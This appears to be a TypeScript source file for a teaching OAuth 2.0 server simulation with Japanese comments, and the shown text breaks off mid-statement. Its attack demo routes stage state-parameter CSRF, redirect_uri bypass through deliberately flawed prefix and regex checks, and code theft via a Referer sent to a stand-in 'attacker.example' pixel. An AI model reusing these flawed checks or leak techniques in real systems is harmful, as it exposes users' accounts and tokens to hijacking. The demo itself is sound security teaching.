/**
 * OAuth 2.0 認可サーバーシミュレーション + 攻撃デモルート
 *
 * 攻撃ルートは Phase 2 第二コミット (SEC-12 / ROB-FIND-011) で末尾に追加。
 * 各攻撃ルートは `runAttackScenario` ヘルパーを経由し、
 * 1 リクエストで両モード (脆弱+堅牢) を並列実行する (E-2)。
 *
 * 対象 CWE: CWE-352 (CSRF), CWE-601 (Open Redirect), CWE-200/CWE-598 (Info Exposure)
 * 関連設計書: DESIGN/04-safety-guardrails.md, DESIGN/12-attack-oauth.md
 */
import { Hono } from "hono";
import { v4 as uuidv4 } from "uuid";
import jwt from "jsonwebtoken";
import bcrypt from "bcryptjs";
import crypto from "crypto";
import { getDb } from "../db/schema.js";
import {
  parseBody,
  oauthAuthorizeSchema,
  oauthTokenSchema,
  oauthAttackStateCsrfSchema,
  oauthAttackRedirectUriBypassSchema,
  oauthAttackCodeViaRefererSchema,
} from "../validation.js";
import { runAttackScenario, maskSecret, sanitizeForDisplay } from "../utils/attack-runner.js";
import type { UserRow, OAuthClientRow, OAuthCodeRow, OAuthTokenRow } from "../../shared/api-types.js";

export const oauthSimRoutes = new Hono();

const OAUTH_SECRET = "osi-demo-oauth-secret";
const VALID_SCOPES = ["read", "write", "admin", "profile", "email"] as const;

// Step 1: Authorization request — returns what the auth server would show
oauthSimRoutes.get("/authorize", (c) => {
  const trace = c.get("trace");
  const clientId = c.req.query("client_id") || "";
  const redirectUri = c.req.query("redirect_uri") || "";
  const scope = c.req.query("scope") || "read";
  const state = c.req.query("state") || "";

  const db = getDb();
  const client = db.prepare("SELECT client_id, client_secret, name, redirect_uris FROM oauth_clients WHERE client_id = ?").get(clientId) as OAuthClientRow | undefined;
  trace.addDbQuery({
    sql: "SELECT client_id, name, redirect_uris FROM oauth_clients WHERE client_id = ?",
    params: [clientId],
    rows: client ? [client] : [],
    ms: 0,
  });

  if (!client) {
    return c.json({ success: false, error: "Unknown client_id" }, 400);
  }

  // Validate redirect_uri against registered URIs
  const registeredUris: string[] = JSON.parse(client.redirect_uris || "[]");
  if (redirectUri && !registeredUris.includes(redirectUri)) {
    return c.json({
      success: false,
      error: `Invalid redirect_uri. Registered: ${registeredUris.join(", ")}`,
    }, 400);
  }

  return c.json({
    success: true,
    data: {
      step: "authorization_page",
      client: { id: client.client_id, name: client.name },
      requestedScope: scope,
      redirectUri,
      state,
      message: "User sees consent screen — approve or deny",
    },
  });
});

// Step 2: User approves → auth code generated
oauthSimRoutes.post("/authorize", async (c) => {
  const parsed = await parseBody(c, oauthAuthorizeSchema);
  if ("error" in parsed) return parsed.error;
  const { client_id, redirect_uri, scope, state, username, password } = parsed.data;
  const trace = c.get("trace");
  const db = getDb();

  // Validate client and redirect_uri
  const client = db.prepare("SELECT client_id, client_secret, name, redirect_uris FROM oauth_clients WHERE client_id = ?").get(client_id) as OAuthClientRow | undefined;
  if (!client) {
    return c.json({ success: false, error: "Unknown client_id" }, 400);
  }
  const registeredUris: string[] = JSON.parse(client.redirect_uris || "[]");
  if (redirect_uri && !registeredUris.includes(redirect_uri)) {
    return c.json({
      success: false,
      error: `Invalid redirect_uri. Registered: ${registeredUris.join(", ")}`,
    }, 400);
  }

  // Authenticate user
  const user = db.prepare("SELECT id, username, password_hash FROM users WHERE username = ?").get(username) as UserRow | undefined;
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return c.json({ success: false, error: "Invalid credentials" }, 401);
  }

  // Generate authorization code
  const code = uuidv4();
  const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();

  // is_attack_sim=0 で正常系認可コードを明示的に挿入 (E-3)
  db.prepare(
    "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 0)"
  ).run(code, client_id, user.id, scope, redirect_uri, expiresAt);

  trace.addDbQuery({
    sql: "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 0)",
    params: [code, client_id, user.id, scope, redirect_uri, expiresAt],
    ms: 0,
  });

  trace.addCryptoOp({
    op: "generateAuthCode",
    input: `user=${username}, client=${client_id}, scope=${scope}`,
    output: code,
    algo: "UUIDv4",
    detail: "One-time authorization code, valid 10 minutes",
  });

  return c.json({
    success: true,
    data: {
      step: "authorization_code_issued",
      code,
      redirectUri: `${redirect_uri}?code=${code}&state=${state}`,
      expiresAt,
    },
  });
});

// Step 3: Exchange code for tokens
oauthSimRoutes.post("/token", async (c) => {
  const parsedBody = await parseBody(c, oauthTokenSchema);
  if ("error" in parsedBody) return parsedBody.error;
  const body = parsedBody.data;
  const trace = c.get("trace");
  const db = getDb();

  if (body.grant_type === "authorization_code") {
    const { code, client_id, client_secret } = body;

    // Verify client
    const client = db.prepare(
      "SELECT client_id, client_secret, name, redirect_uris FROM oauth_clients WHERE client_id = ? AND client_secret = ?"
    ).get(client_id, client_secret) as OAuthClientRow | undefined;
    trace.addDbQuery({
      sql: "SELECT client_id, name, redirect_uris FROM oauth_clients WHERE client_id = ? AND client_secret = ?",
      params: [client_id, "***"],
      rows: client ? [{ client_id: client.client_id, name: client.name }] : [],
      ms: 0,
    });

    if (!client) {
      return c.json({ success: false, error: "Invalid client credentials" }, 401);
    }

    // Atomically mark code as used and verify in one step (prevents double-spend race condition)
    // is_attack_sim=0 のみ対象 (E-3: 攻撃シミュレーションの認可コードを誤更新しない)
    const t1 = performance.now();
    const codeUpdate = db.prepare(
      "UPDATE oauth_codes SET used = 1 WHERE code = ? AND client_id = ? AND used = 0 AND expires_at > datetime('now') AND is_attack_sim = 0"
    ).run(code, client_id);
    trace.addDbQuery({
      sql: "UPDATE oauth_codes SET used = 1 WHERE code = ? AND client_id = ? AND used = 0 AND expires_at > datetime('now') AND is_attack_sim = 0",
      params: [code, client_id],
      rows: [{ changes: codeUpdate.changes }],
      ms: performance.now() - t1,
    });

    if (codeUpdate.changes === 0) {
      return c.json({ success: false, error: "Invalid or expired authorization code" }, 400);
    }

    // Fetch the code details for token generation (is_attack_sim=0 のみ)
    const authCode = db.prepare(
      "SELECT code, client_id, user_id, scope, redirect_uri, expires_at, used FROM oauth_codes WHERE code = ? AND client_id = ? AND is_attack_sim = 0"
    ).get(code, client_id) as OAuthCodeRow | undefined;

    if (!authCode) {
      return c.json({ success: false, error: "Authorization code not found" }, 400);
    }

    // Validate redirect_uri matches the one used during authorization
    if (body.redirect_uri && body.redirect_uri !== authCode.redirect_uri) {
      return c.json({ success: false, error: "redirect_uri mismatch" }, 400);
    }

    // Generate tokens
    const user = db.prepare("SELECT id, username FROM users WHERE id = ?").get(authCode.user_id) as Pick<UserRow, "id" | "username"> | undefined;
    if (!user) {
      return c.json({ success: false, error: "User associated with authorization code not found" }, 500);
    }
    const accessToken = jwt.sign(
      { sub: user.id, username: user.username, scope: authCode.scope, type: "oauth_access" },
      OAUTH_SECRET,
      { expiresIn: "1h" }
    );
    const refreshToken = uuidv4();
    const expiresAt = new Date(Date.now() + 3600 * 1000).toISOString();

    // is_attack_sim=0 で正常系トークンを挿入 (E-3)
    db.prepare(
      "INSERT INTO oauth_tokens (access_token, refresh_token, client_id, user_id, scope, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 0)"
    ).run(accessToken, refreshToken, client_id, user.id, authCode.scope, expiresAt);

    trace.addCryptoOp({
      op: "jwt.sign(oauth_access_token)",
      input: JSON.stringify({ sub: user.id, scope: authCode.scope }),
      output: accessToken.substring(0, 40) + "...",
      algo: "HS256",
    });

    return c.json({
      success: true,
      data: {
        access_token: accessToken,
        token_type: "Bearer",
        expires_in: 3600,
        refresh_token: refreshToken,
        scope: authCode.scope,
      },
    });
  }

  if (body.grant_type === "refresh_token") {
    const { refresh_token, client_id } = body;
    // is_attack_sim=0 のみ対象 (E-3: 攻撃シミュレーションのトークンと混在しない)
    const tokenRow = db.prepare(
      "SELECT access_token, refresh_token, client_id, user_id, scope, expires_at FROM oauth_tokens WHERE refresh_token = ? AND client_id = ? AND is_attack_sim = 0"
    ).get(refresh_token, client_id) as OAuthTokenRow | undefined;

    if (!tokenRow) {
      return c.json({ success: false, error: "Invalid refresh token" }, 400);
    }

    const user = db.prepare("SELECT id, username FROM users WHERE id = ?").get(tokenRow.user_id) as Pick<UserRow, "id" | "username"> | undefined;
    if (!user) {
      return c.json({ success: false, error: "User associated with token not found" }, 500);
    }
    const newAccessToken = jwt.sign(
      { sub: user.id, username: user.username, scope: tokenRow.scope, type: "oauth_access" },
      OAUTH_SECRET,
      { expiresIn: "1h" }
    );
    const newRefreshToken = uuidv4();
    const expiresAt = new Date(Date.now() + 3600 * 1000).toISOString();

    db.prepare("DELETE FROM oauth_tokens WHERE refresh_token = ? AND is_attack_sim = 0").run(refresh_token);
    db.prepare(
      "INSERT INTO oauth_tokens (access_token, refresh_token, client_id, user_id, scope, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 0)"
    ).run(newAccessToken, newRefreshToken, client_id, user.id, tokenRow.scope, expiresAt);

    return c.json({
      success: true,
      data: {
        access_token: newAccessToken,
        token_type: "Bearer",
        expires_in: 3600,
        refresh_token: newRefreshToken,
        scope: tokenRow.scope,
      },
    });
  }

  return c.json({ success: false, error: "Unsupported grant_type" }, 400);
});

// Step 4: Access protected resource
oauthSimRoutes.get("/resource", (c) => {
  const trace = c.get("trace");
  const authHeader = c.req.header("Authorization");

  if (!authHeader?.startsWith("Bearer ")) {
    return c.json({ success: false, error: "No Bearer token" }, 401);
  }

  try {
    const decoded = jwt.verify(authHeader.slice(7), OAUTH_SECRET) as unknown as { sub: number; username: string; scope: string };
    trace.addCryptoOp({
      op: "jwt.verify(oauth_access_token)",
      input: authHeader.slice(7).substring(0, 30) + "...",
      output: "VALID ✓",
      algo: "HS256",
    });

    return c.json({
      success: true,
      data: {
        resource: {
          message: "Protected resource accessed successfully",
          user: decoded.username,
          scope: decoded.scope,
          data: [
            { id: 1, title: "Article 1", content: "OAuth-protected content" },
            { id: 2, title: "Article 2", content: "More protected content" },
          ],
        },
      },
    });
  } catch {
    return c.json({ success: false, error: "Invalid or expired token" }, 401);
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// 攻撃デモルート (Phase 2)
// 【教育目的専用】— 外部ネットワークへのリクエストは行いません
// is_attack_sim=1 を明示し、正常系レコードと完全に分離します
// ─────────────────────────────────────────────────────────────────────────────

// ── 攻撃シナリオで使う固定登録 URI ──
const REGISTERED_REDIRECT_URI = "http://localhost:3000/auth/oauth/callback";

// ── Scenario A: state パラメータ欠落 CSRF ──
type StateCsrfExtra = {
  victimSessionLinkedTo: string;
  expectedState: string;
  receivedState: string;
};

oauthSimRoutes.post("/attack/state-csrf", (c) =>
  runAttackScenario<typeof oauthAttackStateCsrfSchema, StateCsrfExtra>(c, {
    schema: oauthAttackStateCsrfSchema,
    scenarioId: "oauth-state-csrf",
    tabId: "oauth",
    async handler({ trace, db, recordStep }) {
      // 攻撃者の認可コードを生成 (attacker_charlie の user_id を取得)
      const attackerUser = db
        .prepare("SELECT id, username FROM users WHERE username = ?")
        .get("attacker_charlie") as { id: number; username: string } | undefined;
      const attackerUserId = attackerUser?.id ?? 0;
      const attackerUsername = attackerUser?.username ?? "attacker_charlie";

      const attackerCode = uuidv4();
      const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();

      db.prepare(
        "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)"
      ).run(attackerCode, "demo-app", attackerUserId, "read", REGISTERED_REDIRECT_URI, expiresAt);

      trace.addDbQuery({
        sql: "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)",
        params: [attackerCode, "demo-app", attackerUserId, "read", REGISTERED_REDIRECT_URI, expiresAt],
        ms: 0,
      });

      // ── Step 1: probe — 被害者が state なしでログインを開始 ──
      recordStep({
        id: "csrf-1",
        kind: "probe",
        label: "Victim initiates login without state",
        labelJa: "被害者が state なしでログインを開始",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: `/api/oauth/authorize?client_id=demo-app&redirect_uri=${encodeURIComponent(REGISTERED_REDIRECT_URI)}&scope=read`,
          },
          response: {
            status: 200,
            body: {
              step: "authorization_page",
              client: { id: "demo-app", name: "OSI Reference Demo App" },
              state: "",
            },
          },
        },
        detailJa: "クライアントが state パラメータを省略しています。これがない場合、コールバックで正規のレスポンスと偽造されたレスポンスを区別できません。",
        detail: "The client omits the state parameter. Without it, the callback cannot distinguish legitimate responses from forged ones.",
      });

      // ── Step 2: tamper — 攻撃者が state なしの URL 構造を観察 ──
      recordStep({
        id: "csrf-2",
        kind: "tamper",
        label: "Attacker observes authorization URL structure without state",
        labelJa: "攻撃者が state なしの認可 URL 構造を観察",
        status: "success",
        payload: {
          type: "generic",
          data: {
            observedPattern: `/api/oauth/authorize?client_id=demo-app&redirect_uri=${REGISTERED_REDIRECT_URI}&scope=read`,
            missingParam: "state",
            note: "No CSRF token in the flow — attacker can forge callback requests",
            noteJa: "フローに CSRF トークンがない — 攻撃者はコールバックを偽造できます",
          },
        },
        detailJa: "state パラメータが省略されているため、攻撃者は被害者のブラウザに自分の認可コードを処理させることができます。",
        detail: "The absence of state means the attacker can force the victim's browser to process the attacker's authorization code.",
      });

      // ── Step 3: forge — 攻撃者のコードで悪意あるコールバック URL を生成 ──
      const maliciousCallbackUrl = `${REGISTERED_REDIRECT_URI}?code=${attackerCode}&state=`;
      recordStep({
        id: "csrf-3",
        kind: "forge",
        label: "Craft malicious callback URL with attacker's code",
        labelJa: "攻撃者のコードで悪意あるコールバック URL を偽造",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: maliciousCallbackUrl,
            headers: { Cookie: "sessionid=VICTIM_SESSION_TOKEN (simulated)" },
          },
        },
        detailJa: "攻撃者は自身の認可コードを含むコールバック URL に被害者を誘導します。被害者のブラウザはこれを正規のコールバックとして処理します。",
        detail: "Attacker tricks the victim into visiting a callback URL with the attacker's code. The victim's browser processes it as a legitimate callback.",
      });

      // ── Step 4: exploit — state 検証なしで攻撃者コードを受理 (脆弱モード) ──
      const expectedState = `state_${Date.now() - 5000}`; // 被害者が設定すべきだった state
      const receivedState = ""; // コールバックで受信した state (空 = 攻撃者のコードに紐付いた値)

      trace.addCryptoOp({
        op: "state_missing",
        input: "(state omitted by client)",
        output: "NO VALIDATION — accepted",
        algo: "comparison",
        detail: "State validation skipped — attacker's code accepted without CSRF check",
      });

      recordStep({
        id: "csrf-4",
        kind: "exploit",
        label: "Victim's session links to attacker account (no state check)",
        labelJa: "state 検証なしで被害者のセッションが攻撃者アカウントに紐付く",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/oauth/attack/state-csrf",
            body: { attackerCode: `${attackerCode.substring(0, 8)}...` },
          },
          response: {
            status: 200,
            body: {
              outcome: "succeeded",
              summaryJa: "この実装は脆弱です: state 検証が省略されているため、CSRF が成立しました",
              linkedAccount: attackerUsername,
            },
          },
        },
        detailJa: "被害者のクライアントが攻撃者のコードをトークンに交換し、被害者のセッションが攻撃者のアイデンティティに紐付きます。",
        detail: "The victim's client exchanges the attacker's code for tokens, linking the victim's session to the attacker's identity.",
      });

      // ── Step 5: verify — state 不一致を検出して拒否 (堅牢モード) ──
      const stateMatch = expectedState === receivedState; // false — 不一致

      trace.addCryptoOp({
        op: "state_verify",
        input: `received="${receivedState}", expected="${expectedState}"`,
        output: "MISMATCH — rejected",
        algo: "comparison",
        detail: "state parameter mismatch detected — CSRF callback rejected",
      });

      recordStep({
        id: "csrf-5",
        kind: "verify",
        label: "State mismatch detected — CSRF blocked",
        labelJa: "state 不一致を検出 — CSRF を阻止",
        status: "blocked",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/oauth/attack/state-csrf",
          },
          response: {
            status: 400,
            body: {
              error: "State parameter mismatch — possible CSRF attack",
              blockedBy: "oauth_state_mismatch",
              summaryJa: "防御が機能しました: state パラメータの不一致が検出され、コールバックが拒否されました",
            },
          },
        },
        detailJa: `受信した state="${receivedState}" が保存済み state="${expectedState}" と一致しません。RFC 6749 §10.12 準拠の CSRF 対策が機能しました。`,
        detail: `Received state="${receivedState}" does not match saved state="${expectedState}". RFC 6749 §10.12 CSRF protection engaged.`,
      });

      return {
        blockedBy: "oauth_state_mismatch",
        summary: "Without state validation, attacker's code linked to victim's session (vulnerable). State mismatch detection blocked the CSRF attack (defense worked).",
        summaryJa: "この実装は state 検証がないため攻撃者のコードが被害者セッションに紐付きましたが、state 不一致検出により CSRF 攻撃をブロックできます。",
        extra: {
          victimSessionLinkedTo: attackerUsername,
          expectedState,
          receivedState,
        } satisfies StateCsrfExtra,
        payload: {
          params: {},
          result: {
            attackerCodePreview: attackerCode.substring(0, 8) + "...",
            stateMatch,
            attackerUsername,
          },
        },
      };
    },
  }),
);

// ── Scenario B: redirect_uri 検証バイパス ──
type RedirectUriBypassExtra = {
  attackerUri: string;
  prefixMatch: boolean;
  regexBadMatch: boolean;
  exactMatch: boolean;
};

const DEFAULT_ATTACKER_REDIRECT_URI =
  "http://localhost:3000/auth/oauth/callback.attacker.example/steal";

oauthSimRoutes.post("/attack/redirect-uri-bypass", (c) =>
  runAttackScenario<typeof oauthAttackRedirectUriBypassSchema, RedirectUriBypassExtra>(c, {
    schema: oauthAttackRedirectUriBypassSchema,
    scenarioId: "oauth-redirect-uri-bypass",
    tabId: "oauth",
    async handler({ body, trace, recordStep }) {
      // SEC FINDING-3: 攻撃者制御 URI は表示前に制御文字除去
      const attackerUri = sanitizeForDisplay(
        body.attackerRedirectUri ?? DEFAULT_ATTACKER_REDIRECT_URI,
        512
      );
      const registeredUris = [REGISTERED_REDIRECT_URI];

      // ── Step 1: probe — 登録済み redirect_uri を観察 ──
      recordStep({
        id: "redir-1",
        kind: "probe",
        label: "Observe registered redirect_uri format",
        labelJa: "登録済み redirect_uri のフォーマットを観察",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: `/api/oauth/authorize?client_id=demo-app&redirect_uri=${encodeURIComponent(REGISTERED_REDIRECT_URI)}&scope=read&state=legit_state`,
          },
          response: {
            status: 200,
            body: {
              step: "authorization_page",
              registeredRedirectUris: registeredUris,
            },
          },
        },
        detailJa: "攻撃者は登録済み redirect_uri を特定し、バイパス試行を設計します。",
        detail: "Attacker identifies the registered redirect_uri to craft a bypass attempt.",
      });

      // ── Step 2: tamper — 前方一致の脆弱パターンを試行 ──
      recordStep({
        id: "redir-2",
        kind: "tamper",
        label: "Identify vulnerable validation patterns (prefix / bad regex)",
        labelJa: "脆弱な検証パターン (前方一致 / 誤正規表現) を特定",
        status: "success",
        payload: {
          type: "generic",
          data: {
            registeredUri: REGISTERED_REDIRECT_URI,
            attackerUri,
            patterns: {
              prefix: `startsWith('${REGISTERED_REDIRECT_URI}') — 前方一致で攻撃者 URI が通過`,
              regex_bad: `/^http:\\/\\/localhost:3000\\/auth\\/oauth\\/callback/.test(uri) — ドット未エスケープで通過`,
              exact: `registeredUris.includes(uri) — 完全一致で拒否`,
            },
          },
        },
        detailJa: "前方一致とドットエスケープ漏れ正規表現は、登録 URI をプレフィックスとする任意の URI を許可してしまいます。",
        detail: "Prefix matching and unescaped-dot regex both allow any URI starting with the registered URI.",
      });

      // ── Step 3: forge — 攻撃者制御 redirect_uri を生成 (実送信なし) ──
      recordStep({
        id: "redir-3",
        kind: "forge",
        label: "Generate attacker-controlled redirect_uri (simulated, no external request)",
        labelJa: "攻撃者制御の redirect_uri を生成 (シミュレーション、実送信なし)",
        status: "success",
        payload: {
          type: "generic",
          data: {
            attackerUri,
            note: "実環境では認可コードが attacker.example に送信されますが、このデモでは /api/oauth/attack/* 内でシミュレーションします",
            bypassTechniques: [
              { mode: "prefix", reason: `startsWith('${REGISTERED_REDIRECT_URI}') → true` },
              { mode: "regex_bad", reason: `/^http:\\/\\/localhost:3000\\/auth\\/oauth\\/callback/.test(...)  → true (dot not escaped)` },
            ],
          },
        },
        detailJa: "前方一致では、登録 URI で始まる任意の URI が通過します。実際の外部リクエストは送信しません。",
        detail: "With prefix matching, any URI starting with the registered URI passes validation. No actual external requests are sent.",
      });

      // ── Step 4: exploit — 脆弱パターン (prefix + regex_bad) 両方で攻撃者 URI が通過 ──
      const prefixMatch = attackerUri.startsWith(REGISTERED_REDIRECT_URI);
      // ドットエスケープ漏れ正規表現 (意図的に脆弱)
      // eslint-disable-next-line no-useless-escape
      const regexBad = /^http:\/\/localhost:3000\/auth\/oauth\/callback/;
      const regexBadMatch = regexBad.test(attackerUri);

      trace.addCryptoOp({
        op: `redirect_uri_validate(mode=prefix)`,
        input: `uri=${attackerUri}, registered=${REGISTERED_REDIRECT_URI}`,
        output: prefixMatch ? "ACCEPTED (脆弱: 前方一致)" : "REJECTED",
        algo: "startsWith",
        detail: "registeredUris.some(r => uri.startsWith(r)) — 設計上の欠陥",
      });
      trace.addCryptoOp({
        op: `redirect_uri_validate(mode=regex_bad)`,
        input: `uri=${attackerUri}, pattern=/^http:\\/\\/localhost:3000\\/auth\\/oauth\\/callback/`,
        output: regexBadMatch ? "ACCEPTED (脆弱: ドットエスケープ漏れ)" : "REJECTED",
        algo: "regex",
        detail: "ドットエスケープ漏れ正規表現 — 設計上の欠陥",
      });

      recordStep({
        id: "redir-4",
        kind: "exploit",
        label: "Both vulnerable patterns accept attacker URI",
        labelJa: "両方の脆弱パターンが攻撃者 URI を受理",
        status: "success",
        payload: {
          type: "generic",
          data: {
            attackerUri,
            prefixMatch,
            regexBadMatch,
            note: "この実装は脆弱です: 前方一致 / 誤正規表現により攻撃者の redirect_uri が受理されました",
            riskJa: "認可コードが attacker.example に送信され、攻撃者はトークン交換に悪用できます (シミュレーション)",
          },
        },
        detailJa: "前方一致とドットエスケープ漏れ正規表現の両方が攻撃者 URI を許可します。完全一致検証のみが安全です。",
        detail: "Both prefix matching and bad regex allow the attacker URI. Only exact-match validation is safe.",
      });

      // ── Step 5: verify — 完全一致検証が攻撃者 URI を拒否 (堅牢モード) ──
      const exactMatch = registeredUris.includes(attackerUri);

      trace.addCryptoOp({
        op: `redirect_uri_validate(mode=exact)`,
        input: `uri=${attackerUri}, registered=[${registeredUris.join(", ")}]`,
        output: exactMatch ? "ACCEPTED" : "REJECTED (安全)",
        algo: "string_equality",
        detail: "registeredUris.includes(redirectUri) — RFC 6749 §3.1.2 準拠",
      });

      recordStep({
        id: "redir-5",
        kind: "verify",
        label: "Exact-match validation rejects attacker URI",
        labelJa: "完全一致検証が攻撃者 URI を拒否",
        status: "blocked",
        payload: {
          type: "http",
          request: {
            method: "POST",
            url: "/api/oauth/attack/redirect-uri-bypass",
          },
          response: {
            status: 400,
            body: {
              error: `Invalid redirect_uri. Registered: ${REGISTERED_REDIRECT_URI}`,
              blockedBy: "oauth_redirect_uri_exact_match",
              summaryJa: "防御が機能しました: 完全一致検証が未登録の redirect_uri を拒否しました",
            },
          },
        },
        detailJa: `registeredUris.includes("${attackerUri}") → false。RFC 6749 §3.1.2 の完全一致検証が機能しました。`,
        detail: `registeredUris.includes("${attackerUri}") → false. RFC 6749 §3.1.2 exact-match validation engaged.`,
      });

      return {
        blockedBy: "oauth_redirect_uri_exact_match",
        summary: "Prefix and bad-regex patterns accepted the attacker URI (vulnerable). Exact-match validation rejected it (defense worked).",
        summaryJa: "この実装は脆弱です: 前方一致 / 誤正規表現により攻撃者の redirect_uri が受理されましたが、完全一致検証はこれを拒否しました。",
        extra: {
          attackerUri,
          prefixMatch,
          regexBadMatch,
          exactMatch,
        } satisfies RedirectUriBypassExtra,
        payload: {
          params: { attackerUri },
          result: { prefixMatch, regexBadMatch, exactMatch },
        },
      };
    },
  }),
);

// ── Scenario C: 認可コード傍受 (Referer 漏洩) ──
type CodeViaRefererExtra = {
  stolenCode: string;
  simulatedReferer: string;
  accessTokenPreview: string | null;
  pkceChallengePreview: string | null;
};

oauthSimRoutes.post("/attack/code-via-referer", (c) =>
  runAttackScenario<typeof oauthAttackCodeViaRefererSchema, CodeViaRefererExtra>(c, {
    schema: oauthAttackCodeViaRefererSchema,
    scenarioId: "oauth-code-via-referer",
    tabId: "oauth",
    async handler({ trace, db, recordStep }) {
      // 被害者 (seed_alice) の認可コードを is_attack_sim=1 で生成
      const aliceUser = db
        .prepare("SELECT id, username FROM users WHERE username = ?")
        .get("seed_alice") as { id: number; username: string } | undefined;
      const aliceId = aliceUser?.id ?? 0;

      const stolenCode = uuidv4();
      const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
      // PKCE 想定: code_challenge を事前に生成 (堅牢パスで参照)
      const codeVerifier = crypto.randomBytes(32).toString("base64url");
      const codeChallenge = crypto.createHash("sha256").update(codeVerifier).digest("base64url");

      db.prepare(
        "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)"
      ).run(stolenCode, "demo-app", aliceId, "read", REGISTERED_REDIRECT_URI, expiresAt);

      trace.addDbQuery({
        sql: "INSERT INTO oauth_codes (code, client_id, user_id, scope, redirect_uri, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)",
        params: [stolenCode, "demo-app", aliceId, "read", REGISTERED_REDIRECT_URI, expiresAt],
        ms: 0,
      });

      // SEC-O-1: extra.simulatedReferer は AttackResult として返却されるため、`stolenCode` は preview に統一する
      // (extra.stolenCode と表示ポリシーを揃える)。完全な認可コードは内部の jwt.sign / DB INSERT のみで使用。
      const stolenCodePreview = stolenCode.substring(0, 8) + "...";
      const simulatedReferer = `${REGISTERED_REDIRECT_URI}?code=${stolenCodePreview}&state=legit_state`;

      // ── Step 1: probe — 認可コードがコールバック URL のクエリに含まれる ──
      recordStep({
        id: "referer-1",
        kind: "probe",
        label: "Authorization code included in callback URL query string",
        labelJa: "認可コードがコールバック URL のクエリパラメータに含まれる",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: simulatedReferer,
          },
          response: {
            status: 200,
            body: { note: "コールバックページが読み込まれた。URL に認可コードが残っている。" },
          },
        },
        detailJa: "認可コードが URL のクエリパラメータとして埋め込まれています。このページから読み込まれるリソースはすべて Referer ヘッダに完全な URL を受け取ります。",
        detail: "The authorization code is embedded in the URL as a query parameter. Any resource loaded from this page will receive the full URL in the Referer header.",
      });

      // ── Step 2: tamper — Referer ヘッダを生成 (外部送信なし) ──
      recordStep({
        id: "referer-2",
        kind: "tamper",
        label: "External resource triggers Referer header with code (simulated)",
        labelJa: "外部リソースの読み込みが認可コードを含む Referer を送信 (シミュレーション)",
        status: "success",
        payload: {
          type: "http",
          request: {
            method: "GET",
            url: "https://attacker.example/pixel.png",
            headers: {
              Referer: simulatedReferer,
              "User-Agent": "Mozilla/5.0 (simulated)",
            },
          },
          response: {
            status: 200,
            body: "(1x1 pixel image — attacker server logs the Referer)",
          },
          tamperedFields: ["Referer"],
        },
        detailJa: "コールバックページに `<img src='https://attacker.example/pixel.png'>` が含まれる場合、ブラウザは Referer に認可コードを含む完全な URL を送信します (実際の外部リクエストは送信しません)。",
        detail: "When the callback page contains an external resource, the browser sends the full URL (with code) as Referer to the attacker's server (no actual external requests sent).",
      });

      // ── Step 3: forge — Referer からコードを抽出 (ログシミュレーション) ──
      trace.addSessionOp({
        action: "simulate_referer_leak",
        data: {
          simulatedLog: `GET /pixel.png HTTP/1.1\nReferer: ${simulatedReferer}\nUser-Agent: Mozilla/5.0 (simulated)`,
          extractedCode: stolenCode.substring(0, 8) + "...",
          note: "実際のサーバーへのリクエストは送信しません — ログ記録のシミュレーションです",
        },
      });

      recordStep({
        id: "referer-3",
        kind: "forge",
        label: "Attacker extracts code from server access log (simulated)",
        labelJa: "攻撃者がサーバーアクセスログからコードを抽出 (シミュレーション)",
        status: "success",
        payload: {
          type: "generic",
          data: {
            serverLog: `GET /pixel.png HTTP/1.1\nReferer: ${simulatedReferer}\nUser-Agent: Mozilla/5.0 (simulated)`,
            extractedCode: stolenCode.substring(0, 8) + "...",
            note: "このデモでは /api/oauth/attack/code-via-referer がログ記録をシミュレーション。実際の外部リクエストは送信しません。",
          },
        },
        detailJa: "攻撃者は自身のサーバーのアクセスログを参照し、Referer ヘッダの値から認可コードを抽出します (シミュレーション)。",
        detail: "Attacker reads their server's access log and extracts the authorization code from the Referer header value (simulated).",
      });

      // ── Step 4: exploit — 盗んだコードでトークン交換が成立 (PKCE なし、脆弱モード) ──
      // HMAC-SHA256 (HS256) で access_token を生成 (oauth-sim.ts の OAUTH_SECRET を参照)
      // ROB-O-2 / SEC-O-1: 旧 hmacPayload (Date.now() 揺れ + デッドコード) を削除。
      // jwt.sign の実引数を _trace の `input` にも渡すことで HMAC-SHA256 入力の一貫性を保つ。
      const jwtSignClaims = { sub: aliceId, username: "seed_alice", scope: "read", type: "oauth_access_stolen" };
      const accessToken = jwt.sign(
        jwtSignClaims,
        OAUTH_SECRET,
        { expiresIn: "1h" }
      );
      const accessTokenPreview = accessToken.substring(0, 40) + "...";

      // 盗まれたトークンを oauth_tokens に is_attack_sim=1 で INSERT
      const expiresAtToken = new Date(Date.now() + 3600 * 1000).toISOString();
      db.prepare(
        "INSERT INTO oauth_tokens (access_token, refresh_token, client_id, user_id, scope, expires_at, is_attack_sim) VALUES (?, ?, ?, ?, ?, ?, 1)"
      ).run(accessToken, uuidv4(), "demo-app", aliceId, "read", expiresAtToken);

      trace.addDbQuery({
